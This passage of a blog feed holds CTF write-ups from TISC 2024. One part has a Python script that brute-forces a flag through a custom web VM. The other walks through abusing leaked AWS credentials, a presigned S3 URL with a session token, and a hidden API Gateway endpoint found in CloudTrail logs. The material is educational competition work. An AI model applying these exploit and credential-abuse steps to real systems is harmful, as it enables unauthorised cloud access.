+JZ:3:6;             # if register 3 is 0, jump over 6 instructions (if the flag.txt file cannot be read, jump straight to the subroutine meant for the public user).
+SUB:3:3:0;          # substitute the comparator and the character file to see if the result is 0
+JZ:3:2;             # if register 3 is 0, jump over 2 instructions to write a file called ascii84.txt into the filesystem, else stop the program.
+HALT;           
+WRITE:ascii84.txt;  # this is proof of evidence to say that a match is found.
+HALT;
+
+# second half is for the public user
+# IMM and STORE instructions are to load the text 'BAE' on memory (to reset the first 3 registers for cleanup purposes)
+IMM:0:66; 
+IMM:1:65;
+IMM:2:69;
+IMM:3:32;
+IMM:4:33;
+IMM:5:34;
+STORE:0:3;
+STORE:1:4;  
+STORE:2:5;
+# if the file does not exist, this means the public user can create the file, write data and display its contents on memory.
+
+# if the file exists (created by admin user), public user cannot write to the file, and when user attempts to read the file, register 0 will be set to 255 (we're using this behaviour to determine a +ve match)
+WRITE:ascii84.txt;
+READ:ascii84.txt;
+</code></pre></div></div>
+
+<p>So with this PoC working when it comes to identifying the letter T, this instruction can be modified to cater to the other characters of the flag. What’s neat about this is that because it is a web application, you can easily code this out using Python. And here’s the code:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">import</span> <span class="n">requests</span><span class="p">,</span> <span class="n">json</span>
+
+<span class="n">TEST_URL</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://localhost:3000</span><span class="sh">"</span>
+<span class="n">PROD_URL</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://chals.tisc24.ctf.sg:50128</span><span class="sh">"</span>
+
+<span class="n">URL</span> <span class="o">=</span> <span class="n">PROD_URL</span>
+
+<span class="n">admin_req_uri</span> <span class="o">=</span> <span class="sh">"</span><span class="s">/requestadmin</span><span class="sh">"</span>
+
+<span class="n">flag</span> <span class="o">=</span> <span class="p">[]</span>
+
+<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span><span class="mi">64</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span><span class="mi">128</span><span class="p">):</span>
+        <span class="n">webasm_instr</span> <span class="o">=</span> <span class="sh">"</span><span class="s">READ:flag.txt;IMM:0:</span><span class="sh">"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="sh">"</span><span class="s">;IMM:2:</span><span class="sh">"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">+</span><span class="sh">"</span><span class="s">;LOAD:3:2;JZ:3:6;SUB:3:3:0;JZ:3:2;HALT;WRITE:ascii</span><span class="sh">"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="sh">"</span><span class="s">.txt;HALT;IMM:0:66;IMM:1:65;IMM:2:69;IMM:3:32;IMM:4:33;IMM:5:34;STORE:0:3;STORE:1:4;STORE:2:5;WRITE:ascii</span><span class="sh">"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="sh">"</span><span class="s">.txt;READ:ascii</span><span class="sh">"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="sh">"</span><span class="s">.txt;</span><span class="sh">"</span>
+        
+        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span> <span class="sh">"</span><span class="s">prgmstr</span><span class="sh">"</span><span class="p">:</span><span class="n">webasm_instr</span> <span class="p">}</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">URL</span><span class="o">+</span><span class="n">admin_req_uri</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+
+        <span class="n">json_resp</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+
+        <span class="n">outcome</span> <span class="o">=</span> <span class="p">(</span><span class="n">json_resp</span><span class="p">[</span><span class="sh">'</span><span class="s">userResult</span><span class="sh">'</span><span class="p">][</span><span class="sh">'</span><span class="s">vm_state</span><span class="sh">'</span><span class="p">][</span><span class="sh">'</span><span class="s">reg</span><span class="sh">'</span><span class="p">]).</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">,</span><span class="sh">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+
+        <span class="k">if</span> <span class="n">outcome</span> <span class="o">==</span> <span class="sh">"</span><span class="s">255</span><span class="sh">"</span><span class="p">:</span>
+            <span class="n">flag</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">i</span><span class="p">)))</span>
+            <span class="k">break</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Final Flag: </span><span class="sh">"</span><span class="o">+</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>And here it is, the flag:</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241120133247.png" alt="" /></p>
+
+<h1 id="thoughts">Thoughts</h1>
+<p>Personally i think this is quite a refreshing web application to be honest, because many would think web applications are more of the typical OWASP Top 10 and stuff. But for this challenge (and tisc24_challenge_2), it’s pretty cool to incorporate different areas and using the web application as a means to interact with such implementations.</p>
+
+<p>Although, what would be cooler for this challenge is if there’s a way to achieve some form of remote command execution (RCE) within the SMOLVM object (i mean there’s already a filesystem for it, so why not create a web-based shell interface)? Or better still, instead of having actual READ/WRITE instructions, make it in such a way that the participants could do assembly related stuff like executing Linux x86 syscall-like instructions? I think that would be somewhat damn slick to do (hmm maybe i could redesign this, but maybe with the challenge creator’s permission of course).</p>
+
+<p>But yeah it’s quite worthy to be of a challenge 7a standard  :)</p>]]></content><author><name>baesenseii</name></author><category term="ctf" /><category term="tisc2024" /><summary type="html"><![CDATA[YAS! Another web application, which is preferably one of my favourites. But truth be told, when i saw the title, i was expecting myself to get screwed whenever i see the letters ‘Asm’. Anyway, when loading the webapp we’re presented with a simple NodeJS web application that looks like this:]]></summary></entry><entry><title type="html">CSIT TISC 2024 CTF Challenge 6a - Meownitoring</title><link href="http://localhost:4000/posts/tisc24_challenge_6a_f360496c/" rel="alternate" type="text/html" title="CSIT TISC 2024 CTF Challenge 6a - Meownitoring" /><published>2024-10-19T00:00:00-05:00</published><updated>2024-10-19T00:00:00-05:00</updated><id>http://localhost:4000/posts/tisc24_challenge_6a_f360496c</id><content type="html" xml:base="http://localhost:4000/posts/tisc24_challenge_6a_f360496c/"><![CDATA[<p>Well based on the description alone it seems that there are two parts to this CTF and we are to look through tons of logs (based on the provided ZIP file, UGHHHH).</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20240930055210.png" alt="" /></p>
+
+<h1 id="getting-flag-1">Getting Flag 1</h1>
+
+<p>After unzipping the file, the following information was displayed in notes.md:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Workplan
+Setup monitoring and logs analysis process for PALINDROME. 
+Compare products (we have 1 beta testing rights, need to source for others)
+
+## Product 1: Meownitoring (Beta Test)
+`https://d231g4hz442ywp.cloudfront.net`
+
+1. Any sensitive info in logs / monitoring? 
+2. How secure is the setup?
+3. Usefulness of dashboard? Buggy? 
+</code></pre></div></div>
+
+<p>Apprently, the Meownitoring web application is simply an interface to link AWS CloudTrail logs based on an AWS IAM user for a much more presentable dashboard (well it beats the hell out of sieving through tons of JSON data). To configure a user to access its CloudTrail logs, the user has to:</p>
+<ul>
+  <li>Register for a new account (signup is hassle-free, and free at the same time.).</li>
+  <li>Configure the ARN of an AWS IAM user.</li>
+</ul>
+
+<p>After going through the AWS CloudTrail logs, it seems that the user of interest is this particular IAM user (with its ARN):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>arn:aws:iam::637423240666:user/dev
+</code></pre></div></div>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20240930054728.png" alt="" /></p>
+
+<p>After loading this ARN value to the Meownitoring website, the app fails. However after close inspection of the HTTP traffic, there is a request to the URI ‘/download’ to retrieve a ZIP file:</p>
+
+<p>https://loggingbucket20174jawws.s3.amazonaws.com/637423240666.zip?AWSAccessKeyId=ASIAXYKJQ7ESIXHMAIZD&amp;Signature=ulfPSJ4CsUopFF8hkT4KCURWpX4%3D&amp;x-amz-security-token=IQoJb3JpZ2luX2VjED4aDmFwLXNvdXRoZWFzdC0xIkgwRgIhAO4uyWH1gX8g8i8AMw6P%2Bgevn4VoHc7waS%2BI78Z%2BKpyiAiEAym22TWPHeQsSZa0GGSWXkhCsGiEkxwHe%2BQ2fZUmT4qsq6QIIdxAAGgw1MzMyNjcwMjAwNjgiDMf4lrrxSkr4SdHAcSrGAlTpsGD06vcLG0fdmjUZ5KnNk5UOpm56hvrrv6ScjIdN2VVH4Mf6cfJ2bhRwbfS7zXOtnQ%2FbAfUDle9FgLxSOweatwcbtPrLCjokyPdz%2FGkd1X778P74dheGQ5IavzzFXcAB46VwNUnANXS4xsWpsQkd%2FxpnE5IXj9zH%2F6xydPI%2FVEZbKMdYz4jAl5lV23Q2zJbAmzavH7RPVRZRTFvPHPoJyWI2uM5z7yi0qhNmOiF8u5i8%2Fs1VWSpg%2FMe5B3Q2roYCnq4riCihxiRO3OrObZZMTKwBANvDt7A016pMSWmE7n5P%2B2enr%2BN%2FBsjg0ApWO9qtyaSfm%2BBGalF%2F5yYyHBpwM%2BhILtguJdBM78Tgrep3HmtijP6z%2BvQK%2FSeMyVbkcVHGX1xpMlpGEw2PrQy0T8kXhDg66qjpYUAnGZW1B6jAmsnBcSA0MI%2BCtrcGOp0B3DnlX%2FlB2SboOH7n80UGERZ8QpX2qACcHXxOgwvuhHn%2Fm6hh5QA%2FcURpyQScYyzQzIkGSfAC%2FFb5bczwI6v3NW6huHh32MfopRwq9YgM7EjpI8Di%2Bd0BlnfjbiEVUZxcrwSd4DsJ7aqbqFyRktFDLzWkskDoBmcWsLemagqalpFguqciyhZ3wm06EYIFZWzi1sVp3YUtP0tHHDEJjg%3D%3D&amp;Expires=1726842371</p>
+
+<p>Copy the URL into your web browser and you should be able to download the ZIP file. Unzip the ZIP file and you should get a series of other logs (more JSON GZ files, but this time from two different regions:</p>
+<ul>
+  <li>ap-southeast-1</li>
+  <li>us-east-1</li>
+</ul>
+
+<p>Go through the logs and you’ll notice another ARN for another AWS IAM user:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>arn:aws:iam::637423240666:role/mewonitoring-lambda-test
+</code></pre></div></div>
+
+<p>Use the Meownitoring web application again to find this, and whaddya know, you’ll see logs ingested by the web application:</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20240930054737.png" alt="" /></p>
+
+<p>And also,  after reading through the logs, it was found that the AWS secret access key and AWS access key ID was shown clearly in the application: (debug aws_secret_access_key) is now in the clear. Using the newfound credentials, and after looking through the logs for possible S3 buckets, the following command was used (with the new credentials):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> aws s3 ls s3://meownitoringtmpbucket.s3.ap-southeast-1.amazonaws.com/
+</code></pre></div></div>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20240930054756.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/Desktop/Cloud/CGCRTS]
+└─$ cat flag1.txt
+
+
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⡷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠋⠈⠻⣮⣳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⡿⠋⠀⠀⠀⠀⠙⣿⣿⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⡿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠿⠿⣿⣷⣶⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⡿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠻⠿⣿⣶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⣀⣠⣤⣤⣀⡀⠀⠀⣀⣴⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣄⠀⠀
+⢀⣤⣾⡿⠟⠛⠛⢿⣿⣶⣾⣿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣷⣦⣀⣀⣤⣶⣿⡿⠿⢿⣿⡀⠀
+⣿⣿⠏⠀⢰⡆⠀⠀⠉⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⡿⠟⠋⠁⠀⠀⢸⣿⠇⠀
+⣿⡟⠀⣀⠈⣀⡀⠒⠃⠀⠙⣿⡆⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠇⠀
+⣿⡇⠀⠛⢠⡋⢙⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀
+⣿⣧⠀⠀⠀⠓⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠋⠀⠀⢸⣧⣤⣤⣶⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⠀⠀
+⣿⣿⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠻⣷⣶⣶⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⠁⠀⠀
+⠈⠛⠻⠿⢿⣿⣷⣶⣦⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⡏⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠻⠿⢿⣿⣷⣶⣦⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⡄⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠻⠿⢿⣿⣷⣶⣦⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡄⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⠿⣿⣷⣶⣶⣤⣤⣀⡀⠀⠀⠀⢀⣴⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡿⣄
+                                   ⠀⠀⠉⠉⠛⠛⠿⠿⣿⣷⣶⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣹
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⢸⣧
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣆⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣶⣾⣿⣿⣿⣿⣤⣄⣀⡀⠀⠀⠀⣿
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣻⣷⣶⣾⣿⣿⡿⢯⣛⣛⡋⠁⠀⠀⠉⠙⠛⠛⠿⣿⣿⡷⣶⣿
+
+
+Here's a partial flag: TISC{m@ny_inf0_frOm_l0gs_
+</code></pre></div></div>
+
+<h1 id="getting-flag-2">Getting Flag 2</h1>
+
+<p>After getting the first flag, we are presented with even MORE notes (notes2.md), and MORE logs (UGHHH):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ cat notes2.md 
+Item 1: Known issue with logs
+Cloudtrail is not enabled prior to some deployments. However, it should have capture most events related to upcoming operations. 
+
+Evaluation of Product 1: Meownitoring (Beta Test) 
+Doesn't seem to be able to process large amount of logs
+TODO: read up on confused deputy problem.
+
+Item 2: Kill switch mechanism
+Kill switch was introduced after EXERCISE-0x74697363 where operators had to terminate the attack on multiple systems manually, which is ineffective and inefficient.
+
+Objective: 
+Develop a simple mechanism: upon invoke, terminates all attack
+Put platform on "sleep" state?
+Rotate the kill switch randomly (i.e., id, stage, route, method), except during designated freeze period.
+
+Upcoming platform freeze: 1 Sep - 30 Oct 2024 
+
+TODO: Rotate kill switch before freeze period.
+</code></pre></div></div>
+
+<p>Now, i tried to use the same approach to go through the JSON files and abusing the ‘grep’ command, but this ended up to be so freaking tiring. It seems quite nuts to be unzipping and sieving through tons of JSON log data, so that is when i found the ‘jq’ application (along with the ‘gunzip’ command to unzip the files).</p>
+
+<p>After experimenting through the commands, the following syntax was used to search for output events:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gunzip -c *.gz | jq '.Records[]
+</code></pre></div></div>
+
+<p>When reading through the various records, i noticed that there’s tons of activities related to Amazon Lambda API gateways (and they are of different sorts). So i modified the command above to identify the accessed Amazon Lambda API gateway endpoints (note that if you want to narrow down the logs, just run it within the ‘ap-southeast-1 2024/07/17’ folder ):</p>
+
+<p><code class="language-plaintext highlighter-rouge">gunzip -c *.gz | jq '.Records[] | select ((.eventSource == "apigateway.amazonaws.com") and (.responseElements != null))' | less</code></p>
+
+<p>So based from the output of this command, we managed to extract quite a number of API IDs:</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20240930054944.png" alt="" /></p>
+
+<p>From this list, we crafted and narrowed down the possible Lambda API URLs:</p>
+
+<ul>
+  <li><a href="https://f7x7yzf9j2.execute-api.ap-southeast-1.amazonaws.com/" title="https://f7x7yzf9j2.execute-api.ap-southeast-1.amazonaws.com/">https://f7x7yzf9j2.execute-api.ap-southeast-1.amazonaws.com/</a></li>
+  <li><a href="https://kv0g2hke5e.execute-api.ap-southeast-1.amazonaws.com/" title="https://kv0g2hke5e.execute-api.ap-southeast-1.amazonaws.com/">https://kv0g2hke5e.execute-api.ap-southeast-1.amazonaws.com/</a></li>
+  <li><a href="https://s14dfgslg5.execute-api.ap-southeast-1.amazonaws.com/" title="https://s14dfgslg5.execute-api.ap-southeast-1.amazonaws.com/">https://s14dfgslg5.execute-api.ap-southeast-1.amazonaws.com/</a></li>
+  <li><a href="https://pxzfkfmjo7.execute-api.ap-southeast-1.amazonaws.com/" title="https://pxzfkfmjo7.execute-api.ap-southeast-1.amazonaws.com/">https://pxzfkfmjo7.execute-api.ap-southeast-1.amazonaws.com/</a></li>
+</ul>
+
+<p>From there I just needed to perform a simple GET request using Burp for all these API endpoints, and whaddya know? Only one endpoint will still be accessible as it responds with “Not Found”:</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20240930055003.png" alt="" /></p>
+
+<p>So from here, we determine that we needed to work with this API: <a href="https://pxzfkfmjo7.execute-api.ap-southeast-1.amazonaws.com/" title="https://pxzfkfmjo7.execute-api.ap-southeast-1.amazonaws.com/">https://pxzfkfmjo7.execute-api.ap-southeast-1.amazonaws.com/</a></p>
+
+<p>In terms of figuring out how to interact with the API, we’ll need to figure out how to communicate with the API gateway and thank you to AWS for the lovely documentation located here: https://docs.aws.amazon.com/apigateway/latest/developerguide/how-to-call-api.html</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241103000828.png" alt="" /></p>
+
+<p>One of the requirements to invoke the REST API is to identify the stage name (as seen in the screenshot above). A quick look into the logs and we can find that the following request reveals the ‘stage name’:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> { 
+ "eventVersion": "1.09", 
+ "userIdentity": { 
+	 "type": "IAMUser", 
+	 "principalId": "AIDAZI2LCYXNLENAY2IQ3", 
+	 "arn": "arn:aws:iam::637423240666:user/dev", 
+	 "accountId": "637423240666", "accessKeyId": "AKIAZI2LCYXNH4OISNEW", "userName": "dev" }, 
+	 "eventTime": "2024-07-17T05:56:53Z", 
+	 "eventSource": "apigateway.amazonaws.com", 
+	 "eventName": "CreateStage", 
+	 "awsRegion": "ap-southeast-1", 
+	 "sourceIPAddress": "8.29.230.19", 
+	 "userAgent": "APN/1.0 HashiCorp/1.0 Terraform/1.3.777 terraform-provider-aws/5.57.0 https://registry.terraform.io/providers/hashicorp/aws aws-sdk-go-v2/1.30.1 os/linux lang/go#1.22.4 md/GOOS#linux md/GOARCH#amd64 api/apigatewayv2#1.22.1",  
+    "requestParameters": 
+    { 
+	    **"stageName": "5587y0s9d5aed",** 
+	    "autoDeploy": true, 
+	    "apiId": "pxzfkfmjo7" 
+	}, 
+...
+</code></pre></div></div>
+
+<p>Even with the stage name, we will still need to know the function name, which can be found in the following log output (shows both function name and HTTP Request type as well):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
+  "eventVersion": "1.09",
+  "userIdentity": {
+    "type": "IAMUser",
+    "principalId": "AIDAZI2LCYXNLENAY2IQ3",
+    "arn": "arn:aws:iam::637423240666:user/dev",
+    "accountId": "637423240666",
+    "accessKeyId": "AKIAZI2LCYXNH4OISNEW",
+    "userName": "dev"
+  },
+  "eventTime": "2024-07-17T05:56:53Z",
+  "eventSource": "apigateway.amazonaws.com",
+  "eventName": "UpdateRoute",
+  "awsRegion": "ap-southeast-1",
+  "sourceIPAddress": "8.29.230.19",
+  "userAgent": "APN/1.0 HashiCorp/1.0 Terraform/1.3.7 terraform-provider-aws/5.57.0 aws-sdk-go-v2/1.30.1 os/linux lang/go#1.22.4 md/GOOS#linux md/GOARCH#amd64 api/apigatewayv2#1.22.1",
+  "requestParameters": {
+    "routeId": "id6oeig",
+    "routeKey": "POST /68fd47b8bf291eeea36480872f5ce29f0edb",
+    "apiId": "pxzfkfmjo7"
+  },
+  "responseElements": {
+    "authorizationType": "NONE",
+    "routeId": "id6oeig",
+    "apiKeyRequired": false,
+    "routeKey": "POST /68fd47b8bf291eeea36480872f5ce29f0edb",
+    "target": "integrations/9wo8sps"
+  },
+  "requestID": "e5b49d72-4664-4723-9cd3-6a9a93a4d7f2",
+  "eventID": "64c0e31e-7de1-4cc6-9136-6d1f0cce05a7",
+  "readOnly": false,
+  "eventType": "AwsApiCall",
+  "managementEvent": true,
+  "recipientAccountId": "637423240666",
+  "eventCategory": "Management"
+}
+...
+</code></pre></div></div>
+
+<p>Based on the following information, we can safely create the following REST API URL, and interacting it with a POST request:
+https://pxzfkfmjo7.execute-api.ap-southeast-1.amazonaws.com/5587y0s9d5aed/68fd47b8bf291eeea36480872f5ce29f0edb</p>
+
+<p>The following curl command was sent to the server and voila, we get the second half of the flag:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">--path-as-is</span> <span class="nt">-i</span> <span class="nt">-s</span> <span class="nt">-k</span> <span class="nt">-X</span> <span class="s1">$'POST'</span> <span class="se">\</span>
+    <span class="nt">-H</span> <span class="s1">$'Host: pxzfkfmjo7.execute-api.ap-southeast-1.amazonaws.com'</span> <span class="nt">-H</span> <span class="s1">$'Sec-Ch-Ua: </span><span class="se">\"</span><span class="s1">Not;A=Brand</span><span class="se">\"</span><span class="s1">;v=</span><span class="se">\"</span><span class="s1">24</span><span class="se">\"</span><span class="s1">, </span><span class="se">\"</span><span class="s1">Chromium</span><span class="se">\"</span><span class="s1">;v=</span><span class="se">\"</span><span class="s1">128</span><span class="se">\"</span><span class="s1">'</span> <span class="nt">-H</span> <span class="s1">$'Sec-Ch-Ua-Mobile: ?0'</span> <span class="nt">-H</span> <span class="s1">$'Sec-Ch-Ua-Platform: </span><span class="se">\"</span><span class="s1">Windows</span><span class="se">\"</span><span class="s1">'</span> <span class="nt">-H</span> <span class="s1">$'Accept-Language: en-US,en;q=0.9'</span> <span class="nt">-H</span> <span class="s1">$'Upgrade-Insecure-Requests: 1'</span> <span class="nt">-H</span> <span class="s1">$'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36'</span> <span class="nt">-H</span> <span class="s1">$'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'</span> <span class="nt">-H</span> <span class="s1">$'Sec-Fetch-Site: none'</span> <span class="nt">-H</span> <span class="s1">$'Sec-Fetch-Mode: navigate'</span> <span class="nt">-H</span> <span class="s1">$'Sec-Fetch-User: ?1'</span> <span class="nt">-H</span> <span class="s1">$'Sec-Fetch-Dest: document'</span> <span class="nt">-H</span> <span class="s1">$'Accept-Encoding: gzip, deflate, br'</span> <span class="nt">-H</span> <span class="s1">$'Priority: u=0, i'</span> <span class="se">\</span>
+    <span class="s1">$'https://pxzfkfmjo7.execute-api.ap-southeast-1.amazonaws.com/5587y0s9d5aed/68fd47b8bf291eeea36480872f5ce29f0edb'</span>
+</code></pre></div></div>
+
+<p>Response:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/2 200 OK
+Date: Fri, 20 Sep 2024 19:46:35 GMT
+Content-Type: application/json
+Content-Length: 47
+Apigw-Requestid: ea2cQiZYSQ0EMQg=
+
+{"flag2": "&amp;_me-0-wn1t0r1nNnG\\//[&gt;^n^&lt;]\\//}"}
+</code></pre></div></div>
+
+<p>Final flag:</p>
+
